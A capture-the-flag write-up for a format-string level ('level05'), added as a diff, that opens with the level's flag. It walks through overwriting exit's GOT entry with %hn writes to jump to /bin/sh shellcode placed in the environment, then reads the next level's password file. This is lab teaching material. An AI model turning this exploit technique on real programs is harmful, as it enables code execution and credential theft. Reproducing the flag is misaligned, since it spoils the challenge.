@@ -1,0 +1,72 @@
+flag: h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+This levels is another format string exploit.
+The code looks like this:
+
+int main() {
+	char buff[100];
+	int i = 0;
+
+	fgets(buff, 100, stdin);
+
+	while (true) {
+		int len = strlen(buff);
+
+		if (i >= len) {
+			printf(buff);
+			exit(0);
+		}
+
+		if (is_capital_alpha(buff[i]))
+			buff[i] += 32
+		}
+
+		i++;
+	}
+}
+
+Note:
+
+This line:
+buff[i] += 32; 
+
+really is this line:
+buff[i] ^= 32; 
+
+But because the 6th bit (2^5 = 32) will never be 1 in the capital letters range (65-90),
+this is strictly equivalent to an addition.
+
+So:
+
+The program takes a string, put each character in lowercase, and then printf the string.
+The printf is unprotected, which means we can exploit the string format.
+
+What we want to do is put a shellcode in the string, then modify the address in the GOT
+of exit so the program executes our shellcode instead of exit.
+
+We first want to get the address of exit in the GOT:
+
+> objdump -R ./level05 | grep exit
+080497e0 R_386_JUMP_SLOT   exit
+
+We then want to get the offset of printf using our usual method: beginning the string
+by abcd then spamming %x and looking for 64636261 => The offset is 10.
+
+Let's put our shellcode in the environ so we can access it somewhere.
+We can get the address of the environ using gdb.
+
+> x/s environ
+0xffffd77c
+
+I'll add 190 to be sure to not be overwote, and 200 NOPs to our program.
+0xffffd77c + 190 = 0xffffd83a
+
+We have enough data to create our payload:
+
+two halves:
+0xd83a = 55354 - 8 bytes already printed = 55346
+0xffff = 65535 - 55354 bytes printed = 10181
+
+(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%55346c"+"%10$hn"+"%10181c"+"%11$hn"'; cat) | SHELLCODE=$(python -c 'print "\x90"*200+"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') ./level05
+
+> cat /home/users/level06/.pass
